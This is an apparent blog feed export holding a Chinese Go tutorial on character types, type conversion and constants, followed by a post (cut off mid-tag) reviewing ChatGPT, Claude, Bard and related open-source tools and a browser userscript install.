    <content type="html"><![CDATA[<h2 id="一-、Go-语言的字符类型"><a href="#一-、Go-语言的字符类型" class="headerlink" title="一 、Go 语言的字符类型"></a>一 、Go 语言的字符类型</h2><p>字符类型在工作中也会非常频繁地用到，是一个非常重要的数据类型。这里主要介绍 Go 语言中处理<strong>字符和字符串</strong>的数据类型</p><h3 id="1-1-字符和字符串类型"><a href="#1-1-字符和字符串类型" class="headerlink" title="1.1 字符和字符串类型"></a>1.1 字符和字符串类型</h3><table><thead><tr><th align="left">序号</th><th align="left">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">byte</td><td align="left"><strong>uint8</strong> 类型的别名，同等于 <strong>uint8</strong>。一般用于表示 <strong>ASCII</strong> 字符，即只能操作简单的字符，<strong>不支持中文操作</strong>。</td></tr><tr><td align="left">2</td><td align="left">rune</td><td align="left"><strong>int32</strong> 类型的别名，同等于 <strong>int32</strong>。一般用于表示 <strong>Unicode</strong> 字符，即可以处理<strong>任何字符</strong>。</td></tr><tr><td align="left">3</td><td align="left">string</td><td align="left">一个指向 byte 数组的指针，可以为<strong>空字符串</strong>不可为<strong>nil</strong>。</td></tr></tbody></table><h3 id="1-2-代码示例"><a href="#1-2-代码示例" class="headerlink" title="1.2 代码示例"></a>1.2 代码示例</h3><p>使用一段代码来更清晰地解释<code>byte</code>和<code>rune</code>的区别，以及了解这三个类型的关系。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">// 将字符串转化为rune的数组，并替换数组第i个元素为ch</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">str2Rune</span><span class="hljs-params">(str *<span class="hljs-type">string</span>, i <span class="hljs-type">int</span>, ch <span class="hljs-type">rune</span>)</span></span> &#123;<br>temp := []<span class="hljs-type">rune</span>(*str)<br>temp[i] = ch<br>*str = <span class="hljs-type">string</span>(temp)<br>&#125;<br><br><span class="hljs-comment">// 将字符串转换为byte的数组，并替换数组第i个元素为ch</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">str2Byte</span><span class="hljs-params">(str *<span class="hljs-type">string</span>, i <span class="hljs-type">int</span>, ch <span class="hljs-type">byte</span>)</span></span> &#123;<br>temp := []<span class="hljs-type">byte</span>(*str)<br>temp[i] = ch<br>*str = <span class="hljs-type">string</span>(temp)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;你好 Hello&quot;</span><br>str1 := <span class="hljs-string">&quot;你好 Hello&quot;</span><br>str2 := <span class="hljs-string">&quot;你好 Hello&quot;</span><br>str2Rune(&amp;str, <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;A&#x27;</span>)  <span class="hljs-comment">//将第1个字符替换为A</span><br>str2Byte(&amp;str1, <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment">//将第3个字符替换为A</span><br>str2Byte(&amp;str2, <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment">// 将第7个字符替换为A</span><br>fmt.Println(<span class="hljs-string">&quot;rune 数组处理中文后: &quot;</span>, str)<br>fmt.Println(<span class="hljs-string">&quot;byte 数组处理中文后: &quot;</span>, str1)<br>fmt.Println(<span class="hljs-string">&quot;byte 数组处理中文后: &quot;</span>, str2)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果如下：</p><p><img src="/../img/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/image-20230421171217768.png" alt="byte 和 rune 区别实例输出结果"></p><hr><p><strong>结论</strong></p><ul><li><code>string</code>可以直接转换为<code>rune</code>或者<code>byte</code>的<strong>数组；</strong></li><li><code>rune</code>和<code>byte</code>可以互相转换；</li><li><code>byte</code> 的操作单位是一个<strong>字节</strong>，可以理解为一个英文字符；</li><li><code>rune</code> 的操作单位是一个<strong>字符</strong>，不管这个字符是什么字符。</li></ul><h2 id="二、-Go-语言的强制类型转换"><a href="#二、-Go-语言的强制类型转换" class="headerlink" title="二、 Go 语言的强制类型转换"></a>二、 Go 语言的强制类型转换</h2><p>Go 语言是一种强类型语言，而且没有<strong>隐式转换</strong>。也就是说运算符左右的<strong>变量类型必须一致</strong>，若不一致就会报错。为了使用户更加的容易使用，所以 Go 语言提供了各个类型之间强制类型转换的内置方法。</p><h3 id="2-1-整型和浮点型互相转换"><a href="#2-1-整型和浮点型互相转换" class="headerlink" title="2.1 整型和浮点型互相转换"></a>2.1 整型和浮点型互相转换</h3><p><strong>整型</strong>和<strong>浮点型</strong>变量之间的相互转换相对容易，只需使用强制类型转换标志 <code>type(variable)</code>就好了。需要注意的是，当<strong>高精度</strong>向<strong>低精度</strong>类型转换的时候，会<strong>失真</strong>。即浮点型向整型转换的时候会失去其小数部分。需要<strong>避免这两个类型的互相转换</strong>。</p><p>但是也有无法避免的场景，比如说计算浮点数和整数的和之类的情况中。就要秉持<strong>不失真原则</strong>，将低精度向高精度转换之后进行计算。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-type">int</span> = <span class="hljs-number">10</span>       <span class="hljs-comment">// 声明一个整型变量a 并给 a 赋值为10</span><br><span class="hljs-keyword">var</span> b <span class="hljs-type">float32</span> = <span class="hljs-number">3.14</span> <span class="hljs-comment">// 声明一个浮点型变量b 并给 b 赋值为3.14</span><br><br>fmt.Println(<span class="hljs-string">&quot;整型转换为浮点型: %f\n&quot;</span>, <span class="hljs-type">float32</span>(a)) <span class="hljs-comment">// 将变量 a 强制转换为浮点型变量并打印</span><br>fmt.Println(<span class="hljs-string">&quot;浮点型转换为整型: %d\n&quot;</span>, <span class="hljs-type">int</span>(b))     <span class="hljs-comment">// 浮点型转为整型会失真</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>最终输出结果为</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cos">整型转换为浮点型: <span class="hljs-built_in">%f</span><br> <span class="hljs-number">10</span><br>浮点型转换为整型: <span class="hljs-built_in">%d</span><br> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>可以发现浮点型转为整型时候，3.14 失真了，结果为 3。</p><h3 id="2-2-整形和字符串互相转换"><a href="#2-2-整形和字符串互相转换" class="headerlink" title="2.2 整形和字符串互相转换"></a>2.2 整形和字符串互相转换</h3><p>整型和字符串类型的变量互相转换，需要依靠 Go 语言提供的转换包<code>strconv</code>。字符串转整型需要使用这个包的<code>Atoi(string)</code>方法，整型转字符串则是<code>Itoa(int)</code>。这种转换用得最多的就是给一些对象进行<strong>编号</strong>。比如需要给张三编号为NO.1，你可能需要将1转换为字符串之后与NO.进行拼接。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;strconv&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-type">int</span> = <span class="hljs-number">10</span>      <span class="hljs-comment">// 定义一个整型变量并赋值为 10</span><br><span class="hljs-keyword">var</span> b <span class="hljs-type">string</span> = <span class="hljs-string">&quot;10&quot;</span> <span class="hljs-comment">// 定义一个字符串类型变量赋值为 &quot;10&quot;</span><br><br>fmt.Printf(<span class="hljs-string">&quot;整型转换为字符串：%s\n&quot;</span>, strconv.Itoa(a))<br>tmp, _ := strconv.Atoi(b)<br>fmt.Printf(<span class="hljs-string">&quot;字符串转换为整型: %d\n&quot;</span>, tmp)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">整型转换为字符串：10<br><span class="hljs-section">字符串转换为整型: 10</span><br></code></pre></td></tr></table></figure><h3 id="2-3-浮点型和字符串互相转换"><a href="#2-3-浮点型和字符串互相转换" class="headerlink" title="2.3 浮点型和字符串互相转换"></a>2.3 浮点型和字符串互相转换</h3><p>浮点型和字符串的互相转换没有直接封装好的转换接口了，需要调用<code>strconvs</code>包中稍微底层一点的接口。浮点型转字符串使用<code>FormatFloat(float64,byte,int,int)</code>方法，字符串转换为浮点型则使用<code>ParseFloat(...)</code>方法。因为浮点数在存储过程中容易因为<strong>精度问题而存在误差</strong>，所以有时候会将<strong>浮点数转换为字符串</strong>进行存储。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;strconv&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>f1 := <span class="hljs-number">0.123456789</span><br>s1 := strconv.FormatFloat(f1, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">32</span>)<br>s2 := strconv.FormatFloat(f1, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">64</span>)<br>s3 := <span class="hljs-string">&quot;0.123456789&quot;</span><br>f2, _ := strconv.ParseFloat(s3, <span class="hljs-number">64</span>)<br>f3, _ := strconv.ParseFloat(s3, <span class="hljs-number">32</span>)<br>fmt.Println(<span class="hljs-string">&quot;将浮点数转换为float32转换为string: &quot;</span>, s2)<br>fmt.Println(<span class="hljs-string">&quot;将float64转换为string: &quot;</span>, s1)<br>fmt.Println(<span class="hljs-string">&quot;将string转换为float64: &quot;</span>, f2)<br>fmt.Println(<span class="hljs-string">&quot;将string转换为float32再强制转换为float54: &quot;</span>, f3)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">将浮点数转换为<span class="hljs-built_in">float</span>32转换为<span class="hljs-built_in">string</span>:  <span class="hljs-number">0.123456789</span><br>将<span class="hljs-built_in">float</span>64转换为<span class="hljs-built_in">string</span>:  <span class="hljs-number">0.12345679</span><br>将<span class="hljs-built_in">string</span>转换为<span class="hljs-built_in">float</span>64:  <span class="hljs-number">0.123456789</span><br>将<span class="hljs-built_in">string</span>转换为<span class="hljs-built_in">float</span>32再强制转换为<span class="hljs-built_in">float</span>54:  <span class="hljs-number">0.12345679104328156</span><br></code></pre></td></tr></table></figure><p>Go 语言中各个数据类型的互相强制转换。主要都是依赖与 <code>strconvs</code> 这个第三方包。这个包中还提供了其它很多的转换方法，在做类型转换的时候要注意：<strong>浮点型在转为整型时会失真。</strong></p><h2 id="三、-Go语言的常量"><a href="#三、-Go语言的常量" class="headerlink" title="三、 Go语言的常量"></a>三、 Go语言的常量</h2><p>常量可以理解为是一个存储了不可以改变的值的变量。常量主要用于<strong>特殊值的语义化</strong>，使这些值在更容易维护的情况下不会被程序所修改。Go 语言中声明常量使用的关键字是<code>const</code>。常量的使用非常广泛，比如说圆周率，再比如说一些明确的错误信息等一些容易被<strong>多次使用的值</strong>，一般都会使用常量进行实例化，使其在需要更改时，更容易维护，同时增加代码可读性。</p><h3 id="3-1-常量定义"><a href="#3-1-常量定义" class="headerlink" title="3.1 常量定义"></a>3.1 常量定义</h3><p>常量定义的形式为 <code>const 常量名 常量类型 = 常量值</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">const</span> c1 <span class="hljs-type">string</span> = <span class="hljs-string">&quot;2023年4月23日&quot;</span><br><span class="hljs-keyword">const</span> c2 = <span class="hljs-string">&quot;2023年4月23日&quot;</span> <span class="hljs-comment">// 和变量一样，常量也可以部使用数据类型直接赋值，其类型和值一致</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(c1)<br>fmt.Println(c2)<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="3-2-多常量定义"><a href="#3-2-多常量定义" class="headerlink" title="3.2 多常量定义"></a>3.2 多常量定义</h3><h4 id="3-2-1-普通模式"><a href="#3-2-1-普通模式" class="headerlink" title="3.2.1 普通模式"></a>3.2.1 普通模式</h4><p>和 Go 语言的变量一样，常量也可以进行<strong>多常量定义</strong>。定义形式为<code>const 常量名,常量名= 常量值,常量值</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br><br><span class="hljs-keyword">import</span> (  <br> <span class="hljs-string">&quot;fmt&quot;</span>  <br>)  <br><br><span class="hljs-keyword">const</span> c1, c2 = <span class="hljs-string">&quot;2020年3月8日&quot;</span>, <span class="hljs-string">&quot;2020年3月9日&quot;</span>  <br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br> fmt.Println(c1)  <br> fmt.Println(c2)  <br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2023</span>年<span class="hljs-number">4</span>月<span class="hljs-number">23</span>日<br><span class="hljs-attribute">2023</span>年<span class="hljs-number">4</span>月<span class="hljs-number">23</span>日<br></code></pre></td></tr></table></figure><h4 id="3-2-2-特殊方式"><a href="#3-2-2-特殊方式" class="headerlink" title="3.2.2 特殊方式"></a>3.2.2 特殊方式</h4><p>在常量的使用中，Go 语言还提供了一种特殊的多常量定义方式——<code>const()</code>。这种定义方式也是比较推荐的常量使用方式。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> (<br>c1 = <span class="hljs-string">&quot;2020年3月8日&quot;</span><br>c2 = <span class="hljs-string">&quot;2020年3月9日&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(c1)<br>fmt.Println(c2)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2020</span>年<span class="hljs-number">3</span>月<span class="hljs-number">8</span>日<br><span class="hljs-attribute">2020</span>年<span class="hljs-number">3</span>月<span class="hljs-number">9</span>日<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Go语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>chatgpt及其大语言模型(LLM)应用</title>
    <link href="/2023/04/20/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/"/>
    <url>/2023/04/20/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>为了顺应时代浪潮（<del>怕被卷没了</del>），开始使用chatgpt这种大语言模型（LLM）应用了，体验了Chatgpt、谷歌Bard、Claude等国外的LLM应用，主要国内也没获取到相关应用到内测资格 hhh</p><p>其中Chatgpt 和 Claude 算是目前本人的主力使用，对中文也很友好，而且能解决代码开发中的效率问题，妥妥生产力！</p><h2 id="2-大语言模型（LLM）"><a href="#2-大语言模型（LLM）" class="headerlink" title="2. 大语言模型（LLM）"></a>2. 大语言模型（LLM）</h2><p>什么是大语言模型？</p><blockquote><p>大语言模型（LLM）是指能够学习和预测人类自然语言的模型，它使用大规模的文本数据来模拟语言的结构和语法规则。LLM通常使用深度学习算法（如循环神经网络，长短时记忆网络等）来提高预测的准确性，并在自然语言处理任务中取得了很好的效果，如自动问答、机器翻译、文本摘要、语音识别等。大型语言模型在机器学习领域拥有广泛的应用，对人工智能发展有很大的推动作用。</p></blockquote><p>———以上来自 Chatgpt 3.5</p><blockquote><p>大语言模型(Large Language Model,简称LLM)是一类使用神经网络训练的大规模语言模型。它们通常包含数十亿个参数,可以学习无监督的大量文本数据,并生成自然语言。目前较知名的LLM有:</p><ol><li>GPT-3:开放AI旗下的模型,包含175亿个参数,可以生成文本、翻译语言、回答问题等。</li><li>BERT:Google开发的语言表示模型,用于自然语言处理任务,包含110M个参数。</li><li>XLNet:谷歌开发的语言模型,包含110M个参数,在多个自然语言处理任务上超过BERT。</li><li>T5:谷歌开发的文本到文本模型,可以用于生成文本和回答问题,包含11B个参数。</li><li>CTRL:Salesforce开发的语言模型,包含13B个参数,可以生成长篇小说和婚礼誓词等长篇文本。</li></ol><p>LLM的主要特征有:</p><ol><li><p>规模巨大:通常包含几十亿个参数,可以学习海量的数据集。</p></li><li><p>无监督学习:不需要人工标注的数据,可以学习一整个维基百科的数据集。</p></li><li><p>多功能:一个模型可以适用于多种自然语言处理任务,如生成文本、翻译、问答、文本摘要等。</p></li><li><p>超过人类表现:在某些任务上已经超过平均人类表现,如阅读理解。</p><p>目前, LLM仍面临生成的文本安全性、健壮性不足的问题。但未来,随着计算资源的增加和模型的进一步提高,LLM有望在更多语言技术场景中发挥重要作用。总之,大语言模型利用深度神经网络和大数据推动了自然语言处理技术的进步,值得我们持续关注。</p></li></ol></blockquote><p>———以上来自Claude</p><h2 id="3-LLM的应用"><a href="#3-LLM的应用" class="headerlink" title="3. LLM的应用"></a>3. LLM的应用</h2><h3 id="3-1-Chatgpt-（🌟🌟🌟🌟🌟）"><a href="#3-1-Chatgpt-（🌟🌟🌟🌟🌟）" class="headerlink" title="3.1 Chatgpt （🌟🌟🌟🌟🌟）"></a>3.1 Chatgpt （🌟🌟🌟🌟🌟）</h3><p>官网：</p><p><a href="https://chat.openai.com/">https://chat.openai.com</a></p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/chatgpt.png" alt="chatgpt"></p><p>至于怎么注册，网上很多了，这里就不赘述</p><h3 id="3-2-Claude-（🌟🌟🌟🌟）"><a href="#3-2-Claude-（🌟🌟🌟🌟）" class="headerlink" title="3.2 Claude （🌟🌟🌟🌟）"></a>3.2 Claude （🌟🌟🌟🌟）</h3><p>“<a href="http://mp.weixin.qq.com/s?__biz=MzIzNjc1NzUzMw==&mid=2247663551&idx=1&sn=0b4d22152423c3977c0e81c19d7a2f32&chksm=e8dec8cddfa941db19bb816db380491ae809762479b77f6f4bb037ffb6396900fc26413c1ace&scene=21#wechat_redirect">ChatGPT最强竞品</a>”，Claude，并且在国内不需要爬墙，<strong>开箱即用</strong>。非常便捷。</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/640.png" alt="Claude"></p><p>官网：<a href="https://www.anthropic.com/claude-in-slack">https://www.anthropic.com/claude-in-slack</a></p><p> 具体测评可看<a href="https://mp.weixin.qq.com/s/QB85YPjh6DMBTPla4NDfXg">量子位</a>的文章，本文也不多赘述</p><p>放一张使用截图</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230420235742231.png" alt="Claude"></p><p>并且，因为Claude是嵌入在slack里面的一个应用，slack的APP端也能在国内使用，同样做到了开箱即用，即便你没有机场也能正常使用，这也是我非常推荐Claude的原因。下面贴个app端的截图</p><p>如果你在web端就是用了Claude就能在<strong>最近的应用</strong>找到它</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422151219622.png" alt="app端的Claude"></p><p>打开就能进行对话，开箱即用。</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422151452112.png" alt="Claude对话"></p><h3 id="3-3-Bard-（🌟🌟）"><a href="#3-3-Bard-（🌟🌟）" class="headerlink" title="3.3 Bard （🌟🌟）"></a>3.3 Bard （🌟🌟）</h3><p>官网：<a href="https://bard.google.com/">https://bard.google.com</a></p><p>对中文不优化，不咋推荐。</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230421000024812.png" alt="Bard"></p><h2 id="4-依靠chatgpt开发的应用"><a href="#4-依靠chatgpt开发的应用" class="headerlink" title="4. 依靠chatgpt开发的应用"></a>4. 依靠chatgpt开发的应用</h2><h3 id="4-1-chatgpt-vercel"><a href="#4-1-chatgpt-vercel" class="headerlink" title="4.1 chatgpt-vercel"></a>4.1 <strong>chatgpt-vercel</strong></h3><p>开源的项目，基于 <a href="https://github.com/ddiu8081/chatgpt-demo">chatgpt-demo</a> 开发，可以用<a href="https://vercel.com/">vercel</a>一键搭建一个，绑定域名灵活使用。</p><p>目前本人也搭建了一个，随手用。不定时更新内置key，</p><p>链接：<a href="https://www.mochazz.cloud/">https://www.mochazz.cloud/</a></p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230421001329154.png" alt="chatgpt-vercel"></p><h3 id="4-2-ChuanhuChatGPT"><a href="#4-2-ChuanhuChatGPT" class="headerlink" title="4.2 ChuanhuChatGPT"></a>4.2 ChuanhuChatGPT</h3><p>另外一个比较优质的开源项目</p><p>为ChatGPT&#x2F;ChatGLM&#x2F;LLaMA等多种LLM提供了一个轻快好用的Web图形界面，也支持一件部署到huggingface上面。</p><p>github地址： <a href="https://github.com/GaiZhenbiao/ChuanhuChatGPT">https://github.com/GaiZhenbiao/ChuanhuChatGPT</a></p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230421001747239.png" alt="ChuanhuChatGPT"></p><h3 id="4-3-Feishu-OpenAI"><a href="#4-3-Feishu-OpenAI" class="headerlink" title="4.3 Feishu-OpenAI"></a>4.3 Feishu-OpenAI</h3><p>项目地址：<a href="https://github.com/ConnectAI-E/Feishu-OpenAI">https://github.com/ConnectAI-E/Feishu-OpenAI</a></p><p>作者为 Connect-AI-E， 机器人功能又多又nice！让工作效率起飞！除了飞书以外的，还有钉钉的chatgpt机器人。具体可看项目。</p><p>项目特点：</p><ul><li>🍏 对话基于 OpenAI-<a href="https://platform.openai.com/account/api-keys">gpt-3.5-turbo</a> 接口</li><li>🍎 通过 lark，将 ChatGPT 接入<a href="https://open.feishu.cn/app">飞书</a>和<a href="https://www.larksuite.com/">飞书国际版</a></li><li>🥒 支持<a href="https://github.com/serverless-devs/serverless-devs">Serverless 云函数</a>、<a href="https://dashboard.cpolar.com/login">本地环境</a>、<a href="https://www.docker.com/">Docker</a>、<a href="https://github.com/Leizhenpeng/feishu-chatgpt/releases/">二进制安装包</a> 等多种渠道部署</li><li>🍋 基于<a href="https://github.com/patrickmn/go-cache">goCache</a>内存键值对缓存</li></ul><p>项目部署的方式也很多</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230421002244049.png" alt="项目部署"></p><h2 id="5-Chatgpt相关插件"><a href="#5-Chatgpt相关插件" class="headerlink" title="5.Chatgpt相关插件"></a>5.Chatgpt相关插件</h2><h3 id="5-1-KeepChatGPT"><a href="#5-1-KeepChatGPT" class="headerlink" title="5.1 KeepChatGPT"></a><strong>5.1 KeepChatGPT</strong></h3><p>一个插件，让你的 ChatGPT 不再报错</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422143858630.png" alt="KeepChatGPT简介"></p><h4 id="5-1-1-安装步骤"><a href="#5-1-1-安装步骤" class="headerlink" title="5.1.1 安装步骤"></a>5.1.1 安装步骤</h4><ul><li>首先需要安装<strong>Tampermonkey</strong></li></ul><ol><li><p>打开油猴脚本官网：<a href="https://www.tampermonkey.net/">https://www.tampermonkey.net/</a></p></li><li><p>选择你当前的浏览器型号，跳转到浏览器商店安装：</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422144344712.png" alt="Tampermonkey官网"></p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422144443061.png" alt="安装"></p></li></ol><p>安装完成后会提示你已安装</p><p><img 